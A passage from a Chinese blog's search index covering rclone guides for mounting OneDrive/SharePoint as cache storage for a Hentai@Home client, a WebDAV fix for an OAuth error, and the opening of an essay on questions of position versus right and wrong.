<pre><code>rclone lsd od4hath:\n</code></pre> <p>\u6765\u6d4b\u8bd5\u4f60\u7684 remote \u662f\u5426\u914d\u7f6e\u6b63\u786e\u3002</p> <p>\u4e0a\u8ff0\u547d\u4ee4\u7684\u542b\u4e49\u662f\u5217\u51fa <code>od4hath</code> \u8fd9\u4e2a remote \u7684\u6839\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u5939\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u8fd9\u662f\u4e00\u4e2a\u5168\u65b0\u7684 OneDrive\uff0c\u90a3\u4e48\u4f60\u5e94\u8be5\u4f1a\u770b\u5230\u4e00\u4e2a\u540d\u4e3a <code>Form</code> \u7684\u6587\u4ef6\u5939\u3002\u8fd9\u5c31\u4ee3\u8868\u4f60\u7684 remote \u5df2\u7ecf\u914d\u7f6e\u6210\u529f\u4e86\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#52-remote","title":"5.2 \u6302\u8f7d remote","text":"<p>\u521b\u5efa\u4e00\u4e2a\u65b0\u6587\u4ef6\u5939\u7528\u4e8e\u6302\u8f7d\uff0c\u5177\u4f53\u8def\u5f84\u5b8c\u5168\u53d6\u51b3\u4e8e\u4f60\u4e2a\u4eba\uff1a</p> <pre><code>mkdir /root/rclone\nmkdir /root/rclone/od4hath\n</code></pre> <p>\u7136\u540e\u518d\u5728\u4f60\u7684 OneDrive \u7f51\u9875\u7248\u4e2d\uff0c\u4e8e\u6839\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u547d\u540d\u4e3a <code>Hath</code>\u3002</p> <p>\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6302\u8f7d\uff1a</p> <pre><code>rclone mount od4hath:Hath /root/rclone/od4hath --allow-other --transfers 4 --buffer-size 32M --vfs-read-chunk-size 128M --vfs-read-chunk-size-limit 0M --vfs-cache-max-size 8000M --vfs-cache-max-age 3360h --allow-non-empty --dir-cache-time 3360h --vfs-cache-mode full --umask 000 --vfs-cache-mode full --no-modtime --vfs-cache-poll-interval 30m\n</code></pre> <p>\u5176\u4e2d\uff0c<code>od4hath:Hath /root/rclone/od4hath</code> \u6307\u7684\u662f\u5c06\u540d\u4e3a <code>od4hath</code> \u7684 remote \u4e2d\u7684 <code>Hath</code> \u6587\u4ef6\u5939\u6302\u8f7d\u5230\u672c\u5730\u7684 <code>/root/rclone/od4hath</code> \u76ee\u5f55\u3002</p> <p>\u5982\u679c\u4f60\u60f3\u6302\u8f7d\u6574\u4e2a remote \u800c\u4e0d\u662f\u5176\u4e2d\u67d0\u4e2a\u6587\u4ef6\u5939\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\uff1a</p> <pre><code>rclone mount od4hath: /root/rclone/od4hath\n</code></pre> <p>\u8fd9\u6837 <code>/root/rclone/od4hath</code> \u76ee\u5f55\u4fbf\u6307\u5411\u4e86\u6574\u4e2a remote\u3002</p> <p>\u547d\u4ee4\u884c\u53c2\u6570\u7684\u542b\u4e49\u8bf7\u53c2\u9605 rclone \u6587\u6863</p> <p>\u8bf7\u6ce8\u610f <code>--vfs-cache-max-size</code> \u53c2\u6570\u7684\u503c\u4e3a\u672c\u5730\u78c1\u76d8\u7f13\u5b58\u5927\u5c0f\uff0c\u8bf7\u52ff\u8bbe\u7f6e\u8fc7\u5927\u3002<code>--transfers</code> \u4e0e <code>--buffer-size</code> \u53c2\u6570\u7684\u4e58\u79ef\u4e3a\u6bcf\u6b21\u4f20\u8f93\u7684\u6700\u5927\u6570\u636e\u91cf\uff0c\u8bf7\u6839\u636e\u4f60\u4e3b\u673a\u4e0a\u7684\u5185\u5b58\u5927\u5c0f\u914c\u60c5\u8bbe\u7f6e\u3002\u5176\u4e2d <code>--buffer-size</code> \u6307\u793a\u6bcf\u4e2a\u6253\u5f00\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u5c06\u4f7f\u7528\u8fd9\u4e48\u591a\u5185\u5b58\u8fdb\u884c\u7f13\u51b2\uff0c<code>--transfers</code> \u6307\u793a\u5e76\u884c\u8fd0\u884c\u7684\u6587\u4ef6\u4f20\u8f93\u6570\u91cf\u3002</p> <p>\u5982\u679c\u4f60\u7684 rclone \u7a0b\u5e8f\u7ecf\u5e38\u88ab Killed\uff0c\u9664\u4e86\u5c1d\u8bd5\u51cf\u5c0f <code>--transfers</code> \u548c <code>--buffer-size</code> \u53c2\u6570\u7684\u503c\u4e4b\u5916\uff0c\u4f60\u8fd8\u53ef\u4ee5\uff1a</p> <ul> <li>\u8bbe\u7f6e <code>--use-mmap</code> \u53c2\u6570</li> <li>\u901a\u8fc7 <code>systemd</code> \u7684 <code>MemoryHigh</code> \u548c <code>MemoryMax</code> \u9009\u9879\uff0c\u5728\u4e0d\u89e6\u53d1 OOM Killer \u7684\u60c5\u51b5\u4e0b\u9650\u5236 rclone \u7684\u5185\u5b58\u4f7f\u7528\u91cf\u3002\uff08\u89c1 How to set a memory limit?\uff09</li> </ul>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#53","title":"5.3 \u6d4b\u8bd5\u6302\u8f7d\u662f\u5426\u6210\u529f","text":"<p>\u73b0\u5728\uff0c\u4f7f\u7528\u4f60\u7684\u547d\u4ee4\u884c\uff0c\u5411\u8be5\u76ee\u5f55\u4e0b\u968f\u4fbf\u5199\u5165\u4e00\u4e2a\u6587\u4ef6\uff1a</p> <pre><code>touch /root/rclone/od4hath/test\n</code></pre> <p>\u5728\u4f60\u7684\u7f51\u9875\u7248 OneDrive \u4e2d\u67e5\u770b <code>Hath</code> \u6587\u4ef6\u5939\uff0c\u4f60\u5e94\u8be5\u4f1a\u770b\u5230\u4e00\u4e2a\u540d\u4e3a <code>test</code> \u7684\u6587\u4ef6\u3002</p> <p>\u5371\u9669</p> <p>\u5728\u8fd9\u4e4b\u540e\uff0c\u5343\u4e07\u4e0d\u8981\u76f4\u63a5\u5728\u7f51\u9875\u7248 OneDrive \u4e2d\u968f\u4fbf\u5220\u9664\u5df2\u7ecf\u6302\u8f7d\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u610f\u6599\u4e4b\u5916\u7684\u9519\u8bef\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#hh","title":"\u516d\u3001\u4e0e H@H \u4e00\u540c\u5de5\u4f5c","text":"<p>\u73b0\u5728\u505c\u6b62\u4f60\u6b63\u5728\u8fd0\u884c\u7684 H@H \u670d\u52a1\u5668\uff0c\u7136\u540e\u5728\u7f51\u9875\u7248 H@H \u63a7\u5236\u53f0\u4e2d\u9009\u62e9 <code>Reset Static Ranges</code>\u3002</p> <p>\u5371\u9669</p> <p>\u5982\u679c\u4f60\u7684 <code>Static Ranges</code> \u6570\u91cf\u5e76\u4e0d\u5c11\uff08\u4f8b\u5982\u6570\u5343\u4e2a\uff09\uff0c\u90a3\u4e48\u4f60\u6216\u8bb8\u53ef\u4ee5\u8bd5\u8bd5\u5c06\u65e7\u7684\u7f13\u5b58\u6587\u4ef6\u5939\u79fb\u5165\u6302\u8f7d\u76ee\u5f55\u3002</p> <p>\u6211\u5e76\u6ca1\u6709\u8fdb\u884c\u5c1d\u8bd5\uff0c\u56e0\u4e3a\u5728\u8fd9\u7bc7\u535a\u5ba2\u5199\u597d\u4e4b\u524d\u6211\u7684 <code>Static Ranges</code> \u53ea\u6709 40 \u4e2a\u3002\u6211\u4e0d\u80fd\u786e\u4fdd\u8fd9\u6837\u505a\u662f\u5426\u4f1a\u5bfc\u81f4\u610f\u6599\u4e4b\u5916\u7684\u9519\u8bef\u3002</p> <p>\u5982\u679c\u4f60\u79fb\u52a8\u6587\u4ef6\u5939\u4e4b\u540e\u4e00\u5207\u5de5\u4f5c\u6b63\u5e38\uff0c\u4e14 H@H \u4eea\u8868\u76d8\u4e2d <code>Trust</code> \u503c\u5e76\u6ca1\u6709\u5938\u5f20\u5730\u51cf\u5c0f\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u653e\u5fc3\u5730\u7ee7\u7eed\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\u3002</p> <p>\u5728\u6302\u8f7d\u76ee\u5f55\u4e2d\u6dfb\u52a0\u4e00\u4e2a <code>cache</code> \u6587\u4ef6\u5939\u4f5c\u4e3a\u7f13\u5b58\u6587\u4ef6\u5939\uff1a</p> <pre><code>mkdir /root/rclone/od4hath/cache\n</code></pre> <p>\u7f16\u8f91\u4f60\u7684 H@H \u670d\u52a1\u5668\u542f\u52a8\u53c2\u6570\uff0c\u52a0\u4e0a\u4e00\u6761\u989d\u5916\u7684 <code>--cache-dir</code>\uff0c\u4f8b\u5982\uff1a</p> <pre><code>java -jar HentaiAtHome.jar --cache-dir=/root/rclone/od4hath/cache\n</code></pre> <p>\u7136\u540e\u8fd0\u884c\u5373\u53ef\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#_6","title":"\u4e03\u3001\u6ce8\u610f\u4e8b\u9879","text":"","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#71","title":"7.1 \u6587\u4ef6\u603b\u6570\u91cf\u9650\u5236","text":"<p>\u4e0d\u5c11\u7684\u4e91\u76d8\u670d\u52a1\u5546\u90fd\u6709\u6587\u4ef6\u603b\u6570\u91cf\u7684\u9650\u5236\uff0c\u5982\u679c\u4f60\u5728\u7f51\u4e0a\u641c <code>OneDrive \u6587\u4ef6\u603b\u6570\u91cf\u9650\u5236</code>\uff0c\u4f60\u4f1a\u53d1\u73b0\u641c\u7d22\u7684\u7ed3\u679c\u662f <code>150000</code> \u4e2a\u3002</p> <p></p> <p>\u56e0\u4e3a\u8fd9\u662f OneDrive \u4e2a\u4eba\u7248\u7684\u9650\u5236\uff0c\u800c\u6211\u4eec\u7528\u7684\u662f OneDrive for Business\uff0c\u5b83\u5e94\u8be5\u53c2\u8003 SharePoint \u7684\u6570\u91cf\u9650\u5236\uff1a</p> <p></p> <p>\u5373 3000 \u4e07\u4e2a\u3002</p> <p>\u6216\u8005\u53c2\u8003\u5fae\u8f6f \u6587\u6863\u3002</p> <p>\u6309\u7167\u6bcf\u4e2a\u6587\u4ef6\u5e73\u5747 350 KB \u6765\u8ba1\u7b97\uff0c3000 \u4e07\u4e2a\u6587\u4ef6\u5927\u7ea6\u5360\u7528 10 TB \u7684\u7a7a\u95f4\uff0c\u8fd9\u5df2\u7ecf\u8d85\u8fc7\u4e86\u5927\u591a\u6570\u4eba\u7684 SharePoint \u5bb9\u91cf\u3002</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u53ef\u4ee5\u5728 H@H \u63a7\u5236\u53f0\u4e2d\u5206\u914d\u5c3d\u53ef\u80fd\u591a\u7684\u7a7a\u95f4\uff0c\u800c\u4e0d\u5fc5\u62c5\u5fc3\u6587\u4ef6\u6570\u91cf\u7684\u9650\u5236\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#72-hh-trust","title":"7.2 H@H \u4eea\u8868\u76d8\u4e2d <code>Trust</code> \u503c\u9aa4\u964d","text":"<p>\u6b63\u5e38\uff0c\u964d\u5230\u8d1f\u6570\u4e5f\u662f\u6b63\u5e38\u7684\u3002</p> <p>\u8fd9\u662f\u56e0\u4e3a\u4f60\u91cd\u7f6e\u4e86\u6240\u6709\u7684 <code>Static Ranges</code>\uff0c\u5c3d\u7ba1 E-Hentai \u4e2d\u5fc3\u670d\u52a1\u5668\u5df2\u7ecf\u901a\u77e5\u6574\u4e2a H@H \u7f51\u7edc\u4e0d\u518d\u4ece\u4f60\u539f\u6709\u7684 <code>Static Ranges</code> \u83b7\u53d6\u4efb\u4f55\u8d44\u6e90\uff0c\u4f46\u603b\u6709\u90e8\u5206\u7f13\u5b58\u7684\u5ba2\u6237\u7aef\u672a\u6536\u5230\u8be5\u901a\u77e5\u5e76\u7ee7\u7eed\u8fde\u63a5\u5230\u4f60\u7684 H@H \u7a0b\u5e8f\uff0c\u76f4\u5230\u8fd9\u4e9b\u5ba2\u6237\u7aef\u88ab\u544a\u77e5\u6587\u4ef6 404\u3002</p> <p>\u8fd9\u4e9b 404 \u72b6\u6001\u7801\u662f\u4f60\u7684 <code>Trust</code> \u9aa4\u964d\u7684\u539f\u56e0\u3002</p> <p>\u522b\u62c5\u5fc3\uff0c\u5982\u679c\u4f60\u7684\u6302\u8f7d\u6587\u4ef6\u5939\u914d\u7f6e\u6b63\u786e\uff0c\u90a3\u4e48\u8fd9\u4e2a\u503c\u4f1a\u5728\u5f88\u77ed\u7684\u65f6\u95f4\u5185\u6062\u590d\u81f3\u6b63\u5e38\u6c34\u5e73\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u53f0\u65e5\u672c\u7684\u670d\u52a1\u5668\uff0c\u5c06\u5728 4 \u5c0f\u65f6\u5185\u5c06 <code>Trust</code> \u503c\u4e0a\u5347\u81f3\u6b63\u6570\uff0c\u5728 8 \u5c0f\u65f6\u5185\u5f00\u59cb\u5206\u914d\u65b0\u7684 <code>Static Ranges</code> \u5e76\u5206\u53d1\u6587\u4ef6\uff0c\u5728 12 \u5c0f\u65f6\u5185 <code>Trust</code> \u503c\u5c06\u5230\u8fbe 800 \u4ee5\u4e0a\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-oauth-failed/","title":"\u901a\u8fc7 WebDAV \u89e3\u51b3 Rclone \u6302\u8f7d SharePoint \u65f6\u9047\u5230 Error: Auth Error","text":"<pre><code>Failure!\nError: Auth Error\nDescription: No code returned by remote server\n</code></pre> <p>\u51fa\u73b0\u8fd9\u4e2a\u9519\u8bef\u7684\u539f\u56e0\u53ef\u80fd\u662f\u4f60\u6240\u5728\u7ec4\u7ec7\u7684\u7ba1\u7406\u5458\u957f\u671f\u672a\u767b\u5f55\uff0c\u800c\u5bfc\u81f4 OAuth \u65e0\u6cd5\u8fdb\u884c\u3002\u522b\u62c5\u5fc3\uff0c\u8fd9\u4e0e\u4f60\u81ea\u5df1\u7684\u8d26\u53f7\u6ca1\u6709\u5173\u7cfb\u3002</p> <p>\u8fd9\u5927\u591a\u662f\u56e0\u4e3a\u8be5\u7ba1\u7406\u5458\u8f83\u61d2\uff0c\u56e0\u4e3a\u957f\u65f6\u95f4\u4e0d\u767b\u5f55\u4f1a\u8981\u6c42\u7ba1\u7406\u5458\u4fee\u6539\u81ea\u5df1\u7684\u5bc6\u7801\uff0c\u4e00\u822c\u4eba\u8c01\u4e50\u610f\u554a\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u5982\u679c\u4f60\u624b\u52a8\u8fdb\u884c OAuth \u6388\u6743\u64cd\u4f5c\uff08\u800c\u4e0d\u8fdb\u884c\u8df3\u8f6c\u7684\u8bdd\uff09\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u6d4f\u89c8\u5668\u4f1a\u7ed9\u51fa\u5982\u4e0b\u63d0\u793a\uff1a</p> <pre><code>Error: \nInvalid Client\n\nError Description:\nAADSTS650051: Using application 'od4hath' is currently not supported for your organization [xxxxxx], because it's in an unmanaged state. An administrator needs to claim ownership of the company by DNS validation of [xxxxxx] before the application 'od4hath' can be provisioned.\n</code></pre> <p>\u6b64\u65f6\u6211\u4eec\u4e0d\u80fd\u518d\u4f7f\u7528 SharePoint \u672c\u4f53\u8fdb\u884c Rclone \u64cd\u4f5c\uff0c\u800c\u9700\u8981\u4f7f\u7528 WebDAV \u8fdb\u884c\u64cd\u4f5c\uff1a</p> <p>\u9996\u5148\uff0c\u767b\u5f55\u6211\u4eec\u7684 SharePoint \u8d26\u53f7\uff0c\u5e76\u8fdb\u5165 OneDrive\uff0c\u53ef\u4ee5\u770b\u5230\u6d4f\u89c8\u5668\u7684 URL \u5e94\u8be5\u662f\uff1a</p> <pre><code>https://____domain____-my.sharepoint.com/personal/____email____/_layouts/15/onedrive.aspx\n</code></pre> <p>\u590d\u5236\u8fd9\u4e2a URL\uff0c\u5c06\u5176\u6539\u5199\u4e3a\uff1a</p> <pre><code>https://____domain____-my.sharepoint.com/personal/____email____/Documents\n</code></pre> <p>\u73b0\u5728\uff0c\u8fd9\u4e2a URL \u5373\u4e3a\u4f60\u7684 WebDAV URL\u3002\u590d\u5236\u8fd9\u4e2a URL \u5e76\u5728\u6d4f\u89c8\u5668\u6253\u5f00\uff0c\u5b83\u5e94\u8be5\u91cd\u5b9a\u5411\u5230\u4f60\u7684 OneDrive \u9996\u9875\u3002</p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Rclone \u8fdb\u884c\u64cd\u4f5c\u4e86\u3002</p> <p>\u5728\u4f60\u7684\u4e91\u670d\u52a1\u5668\u4e0a\u6267\u884c\uff1a</p> <pre><code>rclone config\n</code></pre> <p>\u4f1a\u51fa\u73b0\uff1a</p> <pre><code>e) Edit existing remote\nn) New remote\nd) Delete remote\nr) Rename remote\nc) Copy remote\ns) Set configuration password\nq) Quit config\ne/n/d/r/c/s/q&gt;\n</code></pre> <p>\u9009\u62e9 <code>n</code>\uff0c\u65b0\u5efa\u4e00\u4e2a\uff0c\u5e76\u5c06\u8be5\u65b0 remote \u547d\u540d\uff0c\u5047\u8bbe\u6211\u4eec\u547d\u540d\u4e3a <code>od4hath</code>\u3002</p> <p>\u4e4b\u540e\u4f1a\u51fa\u73b0\uff1a</p> <pre><code>Type of storage to configure.\nEnter a string value. Press Enter for the default (\"\").\nChoose a number from below, or type in your own value\n\n31 / Webdav\n   \\ \"webdav\"\n\nStorage&gt;\n</code></pre> <p>\u9009\u62e9 <code>31</code>\uff0c\u5373 WebDAV\u3002</p> <p>\u7136\u540e\u6309\u7167\u63d0\u793a\u8f93\u5165\u4f60\u7684 URL \u4e0e WebDAV \u8d26\u6237\u540d\u548c\u5bc6\u7801\uff1a</p> <pre><code>** See help for webdav backend at: https://rclone.org/webdav/ **\n\nURL of http host to connect to\nEnter a string value. Press Enter for the default (\"\").\nChoose a number from below, or type in your own value\n 1 / Connect to example.com\n   \\ \"https://example.com\"\nurl&gt;\n</code></pre> <p>\u8f93\u5165\u5148\u524d\u590d\u5236\u7684 URL \u5373\u53ef\u3002</p> <pre><code>Name of the Webdav site/service/software you are using\nEnter a string value. Press Enter for the default (\"\").\nChoose a number from below, or type in your own value\n 1 / Nextcloud\n   \\ \"nextcloud\"\n 2 / Owncloud\n   \\ \"owncloud\"\n 3 / Sharepoint\n   \\ \"sharepoint\"\n 4 / Other site/service or software\n   \\ \"other\"\nvendor&gt;\n</code></pre> <p>\u9009\u62e9 <code>3</code>\uff0c\u5373 Sharepoint\u3002</p> <pre><code>User name\nEnter a string value. Press Enter for the default (\"\").\nuser&gt;\n</code></pre> <p>\u8fd9\u91cc\u7684\u7528\u6237\u540d\u662f\u4f60\u7684 Microsoft \u8d26\u53f7\uff0c\u5373\u4f60\u7684\u90ae\u7bb1\u3002</p> <pre><code>Password.\ny) Yes type in my own password\ng) Generate random password\nn) No leave this optional password blank (default)\ny/g/n&gt;\n</code></pre> <p>\u9009\u62e9 <code>y</code>\uff0c\u8f93\u5165\u4f60\u7684\u5bc6\u7801\u3002</p> <pre><code>Enter the password:\npassword:\nConfirm the password:\npassword:\n</code></pre> <p>\u8fd9\u91cc\u7684\u5bc6\u7801\u662f\u4f60\u7684 Microsoft \u8d26\u53f7\u5bc6\u7801\u3002</p> <pre><code>Bearer token instead of user/pass (eg a Macaroon)\nEnter a string value. Press Enter for the default (\"\").\nbearer_token&gt;\n</code></pre> <p><code>bearer_token</code> \u4e00\u680f\u7559\u7a7a\uff0c\u76f4\u63a5\u56de\u8f66\u3002</p> <pre><code>Edit advanced config? (y/n)\ny) Yes\nn) No (default)\ny/n&gt;\n</code></pre> <p>\u9009\u62e9 <code>n</code>\uff0c\u4e0d\u9700\u8981\u7f16\u8f91\u9ad8\u7ea7\u914d\u7f6e\u3002</p> <p>\u4e4b\u540e\u4f60\u5c06\u83b7\u5f97\u4e00\u4e2a\u5df2\u7ecf\u914d\u7f6e\u597d\u7684 remote\u3002</p>","tags":["guide","sharepoint","rclone"]},{"location":"blog/2022/221115-issue-of-position-or-right-and-wrong/","title":"\u7acb\u573a\u95ee\u9898\u4e0e\u662f\u975e\u95ee\u9898","text":"","tags":["gossip"]},{"location":"blog/2022/221115-issue-of-position-or-right-and-wrong/#_1","title":"\u4e00","text":"<p>\u5f88\u591a\u4e8b\u60c5\u5176\u5b9e\u662f\u6839\u672c\u65e0\u6cd5\u8bc4\u8bba\u5bf9\u9519\u7684\uff0c\u8fd9\u7c7b\u95ee\u9898\u7edd\u5927\u591a\u6570\u548c\u7acb\u573a\u6709\u5173\uff0c\u53eb\u505a\u7acb\u573a\u95ee\u9898\u3002\u4ec0\u4e48\u662f\u7acb\u573a\u95ee\u9898\uff1f\u4f60\u7ad9\u5728\u54ea\u8fb9\u4e3a\u8c01\u8bf4\u8bdd\uff0c\u5c31\u662f\u575a\u6301\u8c01\u7684\u7acb\u573a\uff0c\u4f60\u5c31\u4f1a\u8ba4\u4e3a\u8c01\u662f\u5bf9\u7684\u3002\u8fd9\u7c7b\u95ee\u9898\u5b9e\u9645\u4e0a\u548c\u8c01\u5bf9\u8c01\u9519\u6ca1\u5173\u7cfb\uff0c\u66f4\u91cd\u8981\u7684\u662f\u4f60\u4e3a\u8c01\u8bf4\u8bdd\u3002\u5982\u679c\u4e0d\u9700\u8981\u4e3a\u4efb\u4f55\u4e00\u4e2a\u4eba\u8bf4\u8bdd\uff0c\u4ecd\u7136\u80fd\u5224\u65ad\u5bf9\u9519\u6216\u8005\u5f97\u5230\u4e00\u4e2a\u4e8c\u5143\u7684\u5224\u65ad\uff0c\u90a3\u53eb\u505a\u662f\u975e\u95ee\u9898\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u8bbe\u6211\u7238\u5988\u5435\u67b6\uff0c\u6211\u5988\u95ee\u6211\uff1a</p> <p>\u4f60\u89c9\u5f97\u4f60\u7238\u505a\u5f97\u5bf9\u4e0d\u5bf9\uff1f</p> <p>\u8fd9\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u7acb\u573a\u95ee\u9898\u3002 \u5728\u7acb\u573a\u95ee\u9898\u524d\u9762\uff0c\u6ca1\u6709\u7edd\u5bf9\u7684\u5bf9\u9519\uff0c\u4efb\u4f55\u4e00\u4e2a\u65c1\u89c2\u8005\u4e5f\u6ca1\u6709\u8d44\u683c\u8bc4\u4ef7\u5b83\u7684\u5bf9\u9519\uff0c\u53ea\u6709\u53c2\u4e0e\u8005\u672c\u8eab\u624d\u6709\u8d44\u683c\u3002 \u56e0\u6b64\u6211\u4f1a\u56de\u7b54\u6211\u5988\uff1a</p> <p>\u6ca1\u6709\u7edd\u5bf9\u7684\u5bf9\u9519\uff0c\u5982\u679c\u6211\u662f\u4f60\uff0c\u90a3\u6211\u8ba4\u4e3a\u4f60\u662f\u5bf9\u7684\uff0c\u5982\u679c\u6211\u662f\u6211\u7238\uff0c\u6211\u4f1a\u8ba4\u4e3a\u6211\u7238\u662f\u5bf9\u7684\u3002</p> <p>\u5373\u4f7f\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u5435\u67b6\u4e8b\u4ef6\uff0c\u4e0d\u80fd\u7b80\u5355\u5730\u975e\u9ed1\u5373\u767d\u5730\u8ba4\u4e3a\u8c01\u662f\u5bf9\u7684\u8c01\u662f\u9519\u7684\uff0c\u8fd9\u662f\u6709\u4f9d\u636e\u7684\u3002\u552f\u7269\u8fa9\u8bc1\u6cd5\u544a\u8bc9\u6211\u4eec\uff0c \u6574\u4e2a\u4e16\u754c\u662f\u5728\u8fd0\u52a8\u7740\u7684\uff0c\u7269\u8d28\u4e4b\u95f4\u901a\u8fc7\u8fd0\u52a8\u76f8\u4e92\u8054\u7cfb\u3001\u76f8\u4e92\u4f5c\u7528\uff0c\u5f62\u6210\u4e86\u4f60\u4e2d\u6709\u6211\uff0c\u6211\u4e2d\u6709\u4f60\u7684\u5173\u7cfb\u3002\u5982\u679c\u8131\u79bb\u4e86\u8fd0\u52a8\u8c08\u7269\u8d28\uff0c\u8ba4\u4e3a\u7269\u8d28\u4e4b\u95f4\u76f8\u4e92\u5272\u88c2\uff0c\u5219\u4f1a\u9677\u5165\u5f62\u800c\u4e0a\u5b66\u7684\u9519\u8bef\u3002 \u56e0\u6b64\uff0c\u4e0d\u80fd\u7b80\u5355\u5730\u8bf4\u8c01\u5bf9\u8c01\u9519\uff0c\u5b9e\u9645\u4e0a\u7684\u60c5\u5f62\u6216\u8bb8\u662f\u5176\u4e2d\u4e00\u65b9\u6709\u4e9b\u65b9\u9762\u505a\u5f97\u5bf9\uff0c\u6709\u4e9b\u65b9\u9762\u505a\u5f97\u9519\uff0c\u4e5f\u6709\u4e9b\u65b9\u9762\u65e0\u6cd5\u8bc4\u4ef7\uff0c\u8fd9\u4e0e\u6211\u4eec\u5728\u793e\u4f1a\u4e2d\u9047\u5230\u7684\u7edd\u5927\u591a\u6570\u77db\u76fe\u7c7b\u4f3c\u3002</p> <p>\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u5988\u4e00\u5b9a\u4f1a\u8ffd\u95ee\u6211\uff1a</p> <p>\u90a3\u4f60\u4f5c\u4e3a\u5b50\u5973\uff0c\u4f60\u8ba4\u4e3a\u8c01\u66f4\u5bf9\u5462\uff1f</p> <p>\u8fd9\u4e2a\u95ee\u9898\u5b9e\u9645\u4e0a\u4ecd\u7136\u5728\u8be2\u95ee\u6211\u7684\u7acb\u573a\uff0c\u800c\u8ddf\u8c01\u5bf9\u8c01\u9519\u6ca1\u6709\u4efb\u4f55\u5173\u7cfb\u3002\u8fd9\u7c7b\u95ee\u9898\u901a\u5e38\u4e5f\u662f\u65e0\u6cd5\u56de\u7b54\u7684\u3002\u5f53\u4f60\u5fc5\u987b\u57fa\u4e8e\u5176\u4e2d\u4e00\u4e2a\u4eba\u7684\u7acb\u573a\uff08\u800c\u4e0d\u662f\u4e8b\u4ef6\u672c\u8eab\uff09\u624d\u80fd\u591f\u5f97\u51fa\u662f\u975e\u5224\u65ad\u7684\u65f6\u5019\uff0c\u4f60\u5f97\u5230\u7684\u6240\u8c13\u662f\u975e\u5224\u65ad\u662f\u672c\u8d28\u4e0a\u662f\u4f60\u7684\u7acb\u573a\u3002</p> <p>\u7136\u800c\u5c31\u8fd9\u4ef6\u4e8b\u60c5\u800c\u8a00\uff0c\u4f5c\u4e3a\u5b50\u5973\uff0c\u4f60\u662f\u6ca1\u6709\u529e\u6cd5\u5728\u7236\u6bcd\u5176\u4e2d\u4e00\u65b9\u9009\u62e9\u7acb\u573a\u7684\uff08\u9664\u975e\u4f60\u771f\u7684\u5bf9\u4e00\u65b9\u6709\u504f\u89c1\uff0c\u6216\u8005\u88ab\u8feb\uff09\u3002\u8fd9\u4e2a\u95ee\u9898\u4e0e\uff1a</p> <p>\u914d\u5076\u548c\u6bcd\u4eb2\u6389\u6c34\u91cc\u5148\u6551\u8c01\uff1f\uff08\u6784\u6210\u4e49\u52a1\u51b2\u7a81\uff0c\u53ea\u80fd\u57fa\u4e8e\u7acb\u573a\uff09</p> <p>\u5c0f\u670b\u53cb\u4f60\u66f4\u559c\u6b22\u7238\u7238\u8fd8\u662f\u5988\u5988\u554a\uff1f</p> <p>\u6b64\u7c7b\u95ee\u9898\u7c7b\u4f3c\u3002</p> <p>\u6709\u4e2a\u65f6\u5019\u4f60\u4e5f\u8bb8\u4f1a\u81ea\u5df1\u5b89\u6170\u81ea\u5df1 \u201c\u6211\u56de\u7b54\u7684\u610f\u601d\u662f\u2018\u66f4\u52a0\u2019\uff0c\u4e0d\u662f\u8bf4\u53e6\u4e00\u65b9\u5c31\u4e0d\u597d\u201d\uff0c\u4f46\u5728\u4ed6\u4eba\u770b\u6765\uff0c\u8fd9\u5c31\u662f\u4f60\u7684\u7acb\u573a\uff0c\u6ca1\u5565\u597d\u8bf4\u7684\uff0c\u4ed6\u4eec\u60f3\u770b\u7684\u5176\u5b9e\u5c31\u662f\u4f60\u7684\u7acb\u573a\uff0c\u4ec5\u6b64\u800c\u5df2\u3002</p>","tags":["gossip"]},{"location":"blog/2022/221115-issue-of-position-or-right-and-wrong/#_2","title":"\u4e8c","text":"<p>\u7acb\u573a\u95ee\u9898\u51e0\u4e4e\u5b8c\u5168\u8131\u79bb\u4e86\u8bc4\u4ef7\u662f\u975e\u7684\u8303\u7574\uff0c\u56e0\u6b64\u5728\u57fa\u4e8e\u7acb\u573a\u7684\u60c5\u51b5\u4e0b\u5f97\u5230\u7684\u5224\u65ad\u4e0d\u662f\u5f7b\u5e95\u53ef\u9760\u7684\u3002\u5f53\u7136\uff0c\u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u7acb\u573a\u95ee\u9898\u5c31\u5f88\u574f\u6216\u8005\u8131\u79bb\u4e86\u7acb\u573a\u5c31\u80fd\u5f97\u5230\u53ef\u9760\u7684\u5224\u65ad\u3002\u552f\u7269\u8fa9\u8bc1\u6cd5\u544a\u8bc9\u6211\u4eec\uff0c\u4e8b\u7269\u662f\u666e\u904d\u8054\u7cfb\u7684\uff0c\u4efb\u4f55\u4e8b\u72